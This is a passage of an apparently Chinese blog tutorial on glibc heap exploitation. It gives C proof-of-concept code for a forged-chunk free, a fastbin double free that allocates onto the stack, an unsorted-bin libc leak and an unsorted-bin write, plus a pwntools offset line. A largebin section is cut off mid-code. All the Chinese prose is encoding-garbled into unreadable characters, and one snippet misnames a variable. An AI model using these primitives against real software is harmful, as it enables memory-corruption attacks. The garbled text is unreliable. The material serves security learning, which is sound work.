å¤§å°çš„å—æ—¶å¯ä»¥ç›´æ¥é‡å¯ä¼ªé€  chunkã€‚</p></li><li><p>ä¸èƒ½æ„æˆ double free çš„æƒ…å†µ</p><p>fake_chunkå‰ä¸€ä¸ªé‡Šæ”¾å—ä¸èƒ½æ˜¯fake_chunkæœ¬èº«ï¼Œå¦‚æœæ˜¯çš„è¯_int_freeå‡½æ•°å°±ä¼šæ£€æŸ¥å‡ºæ¥å¹¶ä¸”ä¸­æ–­</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> fck[<span class="hljs-number">6</span>] __attribute__ ((aligned(<span class="hljs-number">16</span>)));    <span class="hljs-comment">//å¯¹é½</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fck addr is %p\n&quot;</span>,fck);<br>    <br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);<br>    fck[<span class="hljs-number">1</span>] = <span class="hljs-number">0x21</span>;   <span class="hljs-comment">//è¯¥ chunk çš„å¤§å°</span><br>    fck[<span class="hljs-number">5</span>] = <span class="hljs-number">0x21</span>;   <span class="hljs-comment">//ä¸‹ä¸€ä¸ª chunk çš„å¤§å°</span><br>    <span class="hljs-built_in">free</span> (&amp;fck[<span class="hljs-number">2</span>]);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;new malloc addr is %p\n&quot;</span>,<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fasthouse.png"></p><p>æˆ‘ä»¬åœ¨ gdb é‡Œé¢èµ°ä¸€é</p><p>é¦–å…ˆåˆ†é… fake chunk ï¼Œæˆ‘ä»¬æŸ¥çœ‹è¯¥åœ°å€çš„å†…å­˜ä¿¡æ¯ï¼ˆæˆ‘ç¼–è¯‘çš„æ—¶å€™å¼€äº†ä¿æŠ¤æ‰€ä»¥æ¯ä¸€æ¬¡è¿è¡Œçš„åœ°å€ä¸ä¸€æ ·ï¼‰</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fasthouse-gdb1.png"></p><p>åœ¨æ‰§è¡Œå®Œèµ‹å€¼æ“ä½œä»¥åå°±å˜æˆäº†è¿™æ ·</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fasthouse-gdb2.png"></p><h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><p>æ‰€è°“ double free å°±æ˜¯åŒä¸€ä¸ªå †è¢«åˆ†é…ä¸¤æ¬¡ï¼Œå…¶å®ä¸ä»…ä»…æ˜¯ä¸¤æ¬¡ä¹Ÿå¯ä»¥æ˜¯å¤šæ¬¡ï¼Œä¹Ÿå°±æ˜¯è¯´è¢«é‡Šæ”¾çš„ chunk åœ¨ fast bin ä¸­å‡ºç°å¤šæ¬¡ã€‚è¿™æ ·ä¹‹åæˆ‘ä»¬å¯ä»¥ä» fast bin é“¾è¡¨ä¸­å–å‡ºåŒä¸€ä¸ªå †å—ï¼Œç»“åˆå †å—çš„æ•°æ®å†…å®¹å¯ä»¥å®ç°ç±»ä¼¼äºç±»å‹æ··æ·†çš„æ•ˆæœå•¦ã€‚ åŒæ ·ï¼Œå› ä¸ºä¸¤æ¬¡é‡Šæ”¾çš„åŒä¸€ä¸ªå †å—ä¼šå°†æŒ‡é’ˆæŒ‡å‘è‡ªå·±ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨æ¥æ³„éœ² heap çš„åœ°å€ã€‚</p><p>double free èƒ½å¤ŸæˆåŠŸçš„åŸå› ä¸»è¦æœ‰ä¸¤éƒ¨åˆ†ï¼š</p><ul><li>fast bin çš„å †å—è¢«é‡Šæ”¾ä»¥å next_chunk çš„ prev_inuse ä½ä¸ä¼šè¢«æ¸…ç©º</li><li>fast bin åœ¨æ‰§è¡Œ free çš„æ—¶å€™ä»…ä»…éªŒè¯äº† main_area ç›´æ¥æŒ‡å‘çš„å—ï¼Œå³é“¾è¡¨æŒ‡é’ˆå¤´éƒ¨çš„å—ã€‚</li></ul><p>æ¼”ç¤ºè¯´æ˜ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc ptr2 addr is %p\n&quot;</span>, ptr2);<br><br>    <span class="hljs-built_in">free</span>(ptr1);<br>    <span class="hljs-built_in">free</span>(ptr2);<br>    <span class="hljs-built_in">free</span>(ptr1);<br><br>    <span class="hljs-comment">// leak heap addr</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ptr2 head addr is %p\n&quot;</span>, ptr1[<span class="hljs-number">0</span>]);<br>    <span class="hljs-comment">// alloc to stack</span><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> fck[<span class="hljs-number">4</span>];<br>    fck[<span class="hljs-number">1</span>] = <span class="hljs-number">0x21</span>;  <span class="hljs-comment">// modify chunk size</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    ptr1[<span class="hljs-number">0</span>] = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fck;<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;alloc to stack %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble.png"></p><p>æˆ‘ä»¬åˆ†åˆ«åœ¨æ¯ä¸€æ¬¡çš„ free å’Œ malloc å¤„ä¸‹æ–­ç‚¹ï¼Œgdb ä¸­çš„æµç¨‹å¦‚ä¸‹ï¼š</p><p>ç¬¬ä¸€æ¬¡ free ptr1ï¼Œptr1çš„åœ°å€è¿›å…¥ fast bin</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble1.png"></p><p>ç¬¬ä¸€æ¬¡ free ptr2ï¼Œptr2 çš„åœ°å€è¿›å…¥ fast bin ï¼Œæ­¤æ—¶ ptr1 çš„ fd æŒ‡é’ˆæŒ‡å‘ ptr2 </p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble2.png"></p><p>ç¬¬äºŒæ¬¡ free ptr1ï¼Œæ­¤æ—¶ ptr2 çš„ fd æŒ‡é’ˆæŒ‡å‘ ptr1ï¼Œptr1 çš„ fd æŒ‡é’ˆä»ç„¶æŒ‡å‘ ptr2 </p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble3.png"></p><p>ç¬¬ä¸€æ¬¡ mallocï¼Œæœ€åè¿›çš„ ptr1 è¢«åˆ†é…å‡ºå»</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble4.png"></p><p>ç¬¬äºŒæ¬¡ mallocï¼Œ ptr2 è¢«åˆ†é…å‡ºå»ï¼Œä½†å› ä¸ºå› ä¸º ptr2 çš„ fd æŒ‡é’ˆæŒ‡å‘ ptr1ï¼Œæ‰€ä»¥ç³»ç»Ÿä»ç„¶è®¤ä¸º ptr1 åœ¨ fast bin ä¸­ï¼Œä½ç½®åœ¨ ptr2ä¹‹åï¼ˆè¿™ä¸ªå›¾æ˜¯æˆ‘ä»¬å¯¹ ptr1è¿›è¡Œäº†ä¸€äº› fd æ··æ·†çš„æ“ä½œä¹‹åæˆªçš„æ‰€ä»¥ ptr1 çš„æŒ‡é’ˆæŒ‡å‘ stackï¼‰</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble5.png"></p><p>ç¬¬ä¸‰æ¬¡mallocå°±ä¼šæŠŠ â€ ç³»ç»Ÿä»¥ä¸ºä»ç„¶åœ¨fast bin é‡Œ â€œ çš„ ptr1åˆ†é…å‡ºå»ã€‚</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble6.png"></p><p>æœ€åå†ä¸€æ¬¡mallocï¼Œå°±ä¼šæŠŠæˆ‘ä»¬æ”¹å†™åçš„åœ°å€åˆ†é…ç»™å †å•¦</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble7.png"></p><h1 id="Unsortedbin-attack"><a href="#Unsortedbin-attack" class="headerlink" title="Unsortedbin attack"></a>Unsortedbin attack</h1><p>ç®€å•å›é¡¾ä¸€ä¸‹ unsortedbin çš„åŸºæœ¬æ¥æºå’Œä½¿ç”¨æƒ…å†µï¼š</p><h3 id="æ¥æº"><a href="#æ¥æº" class="headerlink" title="æ¥æº"></a>æ¥æº</h3><ul><li>å½“ä¸€ä¸ªæ¯”è¾ƒå¤§çš„ chunk è¢«åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ä¹‹åï¼Œå¦‚æœå‰©ä¸‹çš„éƒ¨åˆ†å¤§äº minsize ï¼Œå°±ä¼šè¢«æ”¾åˆ° unsorted bin ä¸­ã€‚</li><li>é‡Šæ”¾ä¸€ä¸ªä¸å±äº fast bin çš„ chunk ï¼Œå¹¶ä¸”è¿™ä¸ª chunk ä¸å’Œ top chunk ç´§é‚»ï¼Œè¿™ä¸ª chunk å°±ä¼šè¢«æ”¾è¿› unsorted bin ä¸­</li><li>å½“è¿›è¡Œ malloc_consolidate æ—¶ï¼Œå¦‚æœä¸æ˜¯å’Œ top chunk è¿‘é‚»çš„è¯ï¼Œå¯èƒ½ä¼šæŠŠåˆå¹¶åçš„ chunk æ”¾åˆ° unsorted bin ä¸­ã€‚</li></ul><h3 id="Unsorted-Bin-Leak"><a href="#Unsorted-Bin-Leak" class="headerlink" title="Unsorted Bin Leak"></a>Unsorted Bin Leak</h3><p>unsorted bin é‡‡ç”¨ FIFOï¼Œå³å…ˆè¿›åå‡ºçš„é¡ºåºé‡Šæ”¾ï¼Œä¹Ÿå°±æ˜¯è¯´ä» unsortedbin ä¸­å–å †å—çš„æ—¶å€™æ˜¯ä»å°¾éƒ¨å–æ‰€ä»¥ unsorted bin ä½¿ç”¨ bk æŒ‡é’ˆéå†å †å—</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> * ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> * ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);  <span class="hljs-comment">// é˜²æ­¢å †å—å¹¶å…¥Top chunkä¸­</span><br>    <span class="hljs-built_in">free</span>(ptr1);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak libc addr is %p -- %p\n&quot;</span>, ptr1[<span class="hljs-number">0</span>], ptr[<span class="hljs-number">1</span>]);  <span class="hljs-comment">//åˆ†åˆ«æ˜¯fd æŒ‡é’ˆå’Œ bk æŒ‡é’ˆ</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>gdb ä¸­çš„è°ƒè¯•æ˜¯è¿™æ ·çš„ï¼š</p><p>free ä¹‹åçš„å †ç»“æ„åŠå†…å­˜</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted1.png"></p><p>å¦‚æœä½ è¿è¡Œäº†ä¸Šé¢çš„ä»£ç ï¼Œå°±ä¼šå‘ç° unsorted bin ä¸­åªæœ‰ä¸€ä¸ª chunk æ—¶ï¼Œbin çš„ fd æŒ‡é’ˆå’Œ bk æŒ‡é’ˆéƒ½æŒ‡å‘ main_arena ã€‚åŒæ ·ï¼Œå¦‚æœæœ‰å¤šä¸ªï¼Œå¤´éƒ¨ bin çš„ fd ä¼šæŒ‡å‘ main_arena ã€‚</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted-leak1.png"></p><p><code>main_arena</code> å’Œ <code>__malloc_hook</code> çš„åœ°å€å·®æ˜¯ 0x10ï¼Œè€Œå¤§å¤šæ•°çš„ libc éƒ½å¯ä»¥ç›´æ¥æŸ¥å‡º <code>__malloc_hook</code> çš„åœ°å€ã€‚ä»¥ pwntools ä¸ºä¾‹</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">main_arena_offset = <span class="hljs-built_in">ELF</span>(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<span class="hljs-selector-class">.symbols</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]</span> + <span class="hljs-number">0</span>x10<br></code></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥è·å¾— <code>main_arena</code> ä¸åŸºåœ°å€çš„åç§»äº†ã€‚</p><h3 id="Unsorted-Bin-Attack-åŸç†"><a href="#Unsorted-Bin-Attack-åŸç†" class="headerlink" title="Unsorted Bin Attack åŸç†"></a>Unsorted Bin Attack åŸç†</h3><p>åœ¨ _int_malloc ä¸­ç”±ä¸€æ®µä¸ bk æŒ‡é’ˆæœ‰å…³çš„ä»£ç ï¼Œå½“å°†ä¸€ä¸ª unsorted bin å–å‡ºçš„æ—¶å€™ï¼Œä¼šå°† <code>bck-&gt;fd</code> çš„ä½ç½®å†™å…¥æœ¬ Unsorted Bin çš„ä½ç½®ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);<br>unsorted_chunks (av)-&gt;bk = bck;   <span class="hljs-comment">//å°† unsorted bin é“¾è¡¨çš„å¤´æŒ‡é’ˆçš„ bkå­—æ®µè®¾ç½®ä¸º bck</span><br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure><blockquote><p>unsorted_chunks (av) ç”¨äºè·å– unsortedbin åŒå‘é“¾è¡¨å¤´éƒ¨çš„æŒ‡é’ˆ</p><p>unsorted_chunks (av) çš„ä¸¤ä¸ªé‡è¦å…ƒç´ ï¼š</p><p>fdï¼šbin [0]ï¼ˆæŒ‡å‘ä¸‹ä¸€å—æ•°æ®ï¼Œè¿™é‡ŒæŒ‡å‘ unsorted bin é“¾è¡¨çš„å¤´éƒ¨ï¼‰</p><p>bkï¼šbin [1]ï¼ˆæŒ‡å‘å‰ä¸€å—æ•°æ®ï¼Œè¿™é‡ŒæŒ‡å‘ unsorted bin é“¾è¡¨çš„å°¾éƒ¨ï¼‰</p></blockquote><p>unsorted bin ä»å°¾éƒ¨ä¾æ¬¡å¾€å‰éå†ï¼Œç”±äºéå†åˆ°ä¸€ä¸ª chunk å°±ä¼šè¿›è¡Œè„±é“¾ï¼Œæ‰€ä»¥å¦‚æœè¦è®¿é—®åˆ°ä¸‹ä¸€ä¸ª chunkï¼Œåªéœ€è¦è®¿é—® <strong>unsorted_chunks (av)-&gt;bk</strong> å°±å¯ä»¥äº†ï¼Œè€Œä¸”å½“ bk å†…å®¹ä¸º <strong>unsorted_chunks (av)</strong> åˆ™å¯ä»¥è¯´æ˜å…¨éƒ¨æ•°æ®å·²ç»è¢«éå†ï¼Œunsortbin æ— å†…å®¹äº†ã€‚</p><p>ä»£ç çš„åä¸¤è¡Œåœ¨åšçš„å°±æ˜¯æŠŠ victim ä¸­é“¾è¡¨ä¸­ç§»é™¤ã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå°±åˆ©ç”¨ <code>bck-&gt;fd = unsorted_chunks (av);</code> å¾€ä¸Šé¢å†™äº†ä¸€ä¸ª <strong>unsorted_chunks (av) çš„åœ°å€</strong>ï¼Œè¿™æ˜¯ä¸€ä¸ªåœ¨ libc ä¸Šçš„åœ°å€ï¼Œç”± 0x7f å¼€å¤´ï¼Œæ˜¯ä¸€ä¸ªå¾ˆå¤§çš„æ•°å­—ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¦‚æœæ§åˆ¶äº† bck ï¼Œé‚£ä¹ˆå°±å¯ä»¥åœ¨è„±é“¾çš„è¿‡ç¨‹ä¸­ï¼Œå¾€ <strong>victim-&gt;bk-&gt;fd</strong> å†™å…¥ä¸€ä¸ªå¾ˆå¤§çš„æ•°å­—ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> target_var = <span class="hljs-number">0</span>;   <span class="hljs-comment">//ç›®æ ‡å†™å…¥çš„æ ˆ</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %ld\n\n&quot;</span>, &amp;target_var, target_var);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);   <span class="hljs-comment">//é˜²æ­¢ä¸ top chunk åˆå¹¶</span><br>    <br>    <span class="hljs-built_in">free</span>(p);<br>    p[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;target_var - <span class="hljs-number">2</span>);  <span class="hljs-comment">//p çš„ bk æŒ‡å‘target_var</span><br>    <br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %p\n&quot;</span>, &amp;target_var, (<span class="hljs-type">void</span>*)target_var);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…·ä½“æµç¨‹å¦‚ä¸‹å›¾</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted_bin_attack_order.png"></p><p>åˆå§‹çŠ¶æ€çš„æ—¶å€™ï¼Œunsorted bin çš„ fd å’Œ bk å‡æŒ‡å‘ unsorted bin æœ¬èº«ã€‚ </p><p>æ‰§è¡Œ free(p) ï¼Œé‡Šæ”¾çš„ chunk è¿›å…¥ unsortedbin </p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted_gdb1.png"></p><p>ä¿®æ”¹ p[1] ä¹‹åï¼ŒåŸæ¥åœ¨ unsorted bin ä¸­çš„ p çš„ bk æŒ‡é’ˆå°±ä¼šæŒ‡å‘ target addr-16 å¤„ä¼ªé€ çš„ chunkï¼Œå³ Target Value å¤„äºä¼ªé€  chunk çš„ fd å¤„ã€‚</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted_gdb2.png"></p><p>å†æ¬¡ç”³è¯· chunkï¼Œå°±ä¼šä» unsortedbin ä¸­å–å‡ºï¼Œæ­¤æ—¶ unsortedbin ä¸­çš„ç»“æ„å˜æˆ</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted_gdb3.png"></p><p>æœ€åç»“æœå¦‚ä¸‹</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted_gdb4.png"></p><h1 id="Largebin-attack"><a href="#Largebin-attack" class="headerlink" title="Largebin attack"></a>Largebin attack</h1><blockquote><p>æè¿™é‡Œçš„æ—¶å€™å¤´æ˜æ˜çš„ï¼Œå…ˆè¿™ä¹ˆæ”¾ç€ï¼Œå¾…ä¿®æ”¹ğŸ˜¶â€ğŸŒ«ï¸</p></blockquote><h3 id="largebin-å¤ä¹ "><a href="#largebin-å¤ä¹ " class="headerlink" title="largebin å¤ä¹ "></a>largebin å¤ä¹ </h3><p>å¤§äº512ï¼ˆ1024ï¼‰å­—èŠ‚çš„ chunk ç§°ä¸º large chunkï¼Œlarge bin å°±æ˜¯ç”¨äºç®¡ç†è¿™äº› large chunk </p><p>è¢«é‡Šæ”¾è¿› Large Bin ä¸­çš„ chunk ï¼Œé™¤äº†å’Œå…¶ä»–çš„ bin ç›¸åŒçš„ prev_sizeã€sizeã€fdã€bk è¿™å‡ ä¸ªç»“æ„ä¹‹å¤–ï¼Œè¿˜å…·æœ‰ fd_nextsize å’Œ bk_nextsize :</p><ul><li>fd_nextsize æŒ‡å‘å‰ä¸€ä¸ªä¸å½“å‰ chunk å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å« bin çš„å¤´æŒ‡é’ˆ</li><li>bk_nextsize æŒ‡å‘åä¸€ä¸ªä¸å½“å‰ chunk å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å« bin çš„å¤´æŒ‡é’ˆ</li></ul><p>ä¸€èˆ¬ç©ºé—²çš„ large chunk åœ¨ fd çš„éå†é¡ºåºä¸­ï¼ŒæŒ‰ç…§ç”±å¤§åˆ°å°çš„é¡ºåºæ’åˆ—ã€‚è¿™æ ·å¯ä»¥é¿å…åœ¨å¯»æ‰¾åˆé€‚ chunk æ—¶æŒ¨ä¸ªéå†,æé«˜äº†å·¥ä½œæ•ˆç‡ã€‚</p><p>æ’åˆ—é¡ºåºï¼š</p><ol><li><p>æŒ‰ç…§å¤§å°é¡ºåºä»å°åˆ°å¤§æ’åº</p></li><li><p>å¦‚æœå¤§å°ç›¸åŒå°±æŒ‰ç…§ free çš„å…ˆåé¡ºåºæ’åº</p></li></ol><p>å¤šä¸ªå¤§å°ç›¸åŒçš„å †å—ï¼Œåªæœ‰é¦–ä¸ªå †å—çš„ fd_nextsize å’Œ bk_nextsize ä¼šæŒ‡å‘å…¶ä»–å †å—ï¼Œåä¹°ä½ å †å—çš„è¿™ä¸¤ä¸ªæŒ‡é’ˆå‡ä¸º0ã€‚size æœ€å¤§çš„å †å—çš„ bk_nextsize æŒ‡å‘æœ€å°çš„å †å—ï¼Œsize æœ€å°çš„å †å—çš„ fd_nextsize æŒ‡å‘æœ€å¤§çš„å †å—</p><h3 id="ç¤ºä¾‹-1"><a href="#ç¤ºä¾‹-1" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var1 = <span class="hljs-number">0</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var2 = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x320</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);   <span class="hljs-comment">//é˜²æ­¢åˆå¹¶ï¼Œä¸‹åŒ</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><span class="hljs-built_in">free</span>(p1);<br><span class="hljs-built_in">free</span>(p2);<br><br> <span class="hljs-type">void</span>* p4 = <span 